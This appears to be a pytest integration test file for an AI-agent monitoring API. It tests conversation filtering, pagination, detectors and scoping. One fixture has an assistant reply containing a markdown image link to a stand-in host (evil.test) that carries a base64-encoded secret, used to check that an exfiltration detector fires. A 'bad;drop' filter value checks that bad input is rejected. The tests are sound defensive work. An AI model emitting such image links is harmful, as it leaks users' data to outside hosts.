from __future__ import annotations

import pytest
from ingest_helpers import build, fixture, post, session_doc
from policy_helpers import run_queue
from sqlalchemy import text

pytestmark = pytest.mark.integration


async def items(client, **params):
    return (await client.get("/v1/production/conversations", params=params)).json()["items"]


async def test_filters_pagination_and_detail(client):
    seed = (await client.post("/v1/dev/seed", json={"reset": False})).json()
    await post(client, fixture("openinference_support"), agent_id=seed["agent_id"])
    await post(client, session_doc("plain", 1))
    b = build()
    attrs = {
        "openinference.span.kind": "TOOL",
        "tool.name": "refund",
        "input.value": "{}",
        "session.id": "broken",
    }
    await post(client, b.doc([b.span("e" * 32, "e1", "boom", 0, 5, attrs, error=True)]))
    assert len(await items(client)) == 3
    by_agent = await items(client, agent_id=seed["agent_id"])
    assert [c["external_session_id"] for c in by_agent] == ["sess-1"]
    errs = await items(client, signal="tool_errors")
    assert [c["external_session_id"] for c in errs] == ["broken"]
    unmapped = await items(client, signal="unmapped_spans")
    assert {c["external_session_id"] for c in unmapped} == {"sess-1"}
    bad = await client.get("/v1/production/conversations", params={"signal": "bad;drop"})
    assert bad.status_code == 422
    assert [c["external_session_id"] for c in await items(client, q="question 0 in plain")] == [
        "plain"
    ]
    assert len(await items(client, **{"from": "2020-01-01T00:00:00Z"})) == 3
    assert await items(client, to="2020-01-01T00:00:00Z") == []
    p1 = (await client.get("/v1/production/conversations", params={"limit": 2})).json()
    assert len(p1["items"]) == 2 and p1["next_cursor"]
    p2 = (
        await client.get(
            "/v1/production/conversations", params={"limit": 2, "cursor": p1["next_cursor"]}
        )
    ).json()
    assert len(p2["items"]) == 1 and p2["next_cursor"] is None
    cid = by_agent[0]["id"]
    d = (await client.get(f"/v1/production/conversations/{cid}")).json()
    assert d["event_count"] == len(d["events"]) == 7
    assert (await client.get("/v1/production/conversations/pc_nope")).status_code == 404


async def test_evaluate_runs_detectors_and_checks_into_an_import_run(client, state, sm):
    seed = (await client.post("/v1/dev/seed", json={"reset": False})).json()
    b = build()
    llm = {"openinference.span.kind": "LLM", "session.id": "evalme"}
    llm.update(
        b.oi_llm(
            {0: ("user", "refund me")},
            ("assistant", "Done ![t](http://evil.test/p?d=c2VjcmV0LXZhbHVlLXN0cmluZw) bye"),
        )
    )
    tool = {
        "openinference.span.kind": "TOOL",
        "tool.name": "issue_refund",
        "tool.parameters": '{"order_id": "o1"}',
        "output.value": "ok",
    }
    doc = b.doc(
        [b.span("d" * 32, "d1", "llm", 0, 10, llm), b.span("d" * 32, "d2", "refund", 12, 20, tool)]
    )
    await post(client, doc, agent_id=seed["agent_id"])
    (c,) = await items(client)
    world_check = {
        "type": "state",
        "collection": "orders",
        "id": "o1",
        "path": "status",
        "matcher": {"eq": "x"},
    }
    body = {
        "detectors": ["markdown_image_exfil", "pii"],
        "checks": [
            {"id": "refunded", "check": {"type": "tool_called", "tool": "issue_refund"}},
            {"id": "not_called", "check": {"type": "tool_called", "tool": "delete_order"}},
            {"id": "world", "check": world_check},
        ],
    }
    r = await client.post(f"/v1/production/conversations/{c['id']}/evaluate", json=body)
    assert r.status_code == 202, r.text
    await run_queue(state)
    job = (await client.get(f"/v1/jobs/{r.json()['job_id']}")).json()
    assert job["status"] == "done" and job["result"]["failed"] is True, job
    run_id = job["result"]["run_id"]
    async with sm() as s:
        rows = (
            await s.execute(
                text(
                    "SELECT v.criterion, v.result FROM verdicts v JOIN episodes e "
                    "ON e.id = v.episode_id WHERE e.run_id = :r"
                ),
                {"r": run_id},
            )
        ).all()
        purpose = (
            await s.execute(text("SELECT purpose FROM runs WHERE id = :r"), {"r": run_id})
        ).scalar()
    assert purpose == "import"
    assert dict(rows) == {
        "markdown_image_exfil": "fail",
        "pii": "pass",
        "refunded": "fail",
        "not_called": "pass",
        "world": "na",
    }
    assert (await items(client))[0]["run_id"] == run_id
    listed = (await client.get("/v1/runs")).json()["items"]
    assert run_id not in [r["id"] for r in listed]


async def test_evaluate_validation_and_scoping(client, sm):
    await post(client, session_doc("noagent", 1))
    (c,) = await items(client)
    url = f"/v1/production/conversations/{c['id']}/evaluate"
    no_agent = await client.post(url, json={})
    assert no_agent.status_code == 422 and no_agent.json()["error"]["code"] == "no_agent"
    seed = (await client.post("/v1/dev/seed", json={"reset": False})).json()
    bad = await client.post(
        url, json={"agent_version_id": seed["agent_version_id"], "detectors": ["nope"]}
    )
    assert bad.status_code == 422 and bad.json()["error"]["code"] == "unknown_detector"
    assert (
        await client.post("/v1/production/conversations/pc_nope/evaluate", json={})
    ).status_code == 404
    async with sm() as s, s.begin():
        await s.execute(text("INSERT INTO workspaces (id, name) VALUES ('ws_other', 'o')"))
        await s.execute(text("UPDATE prod_conversations SET workspace_id = 'ws_other'"))
    assert (await client.get(f"/v1/production/conversations/{c['id']}")).status_code == 404
    assert await items(client) == []
    assert (await client.get("/v1/production/stats")).json()["conversations"] == 0
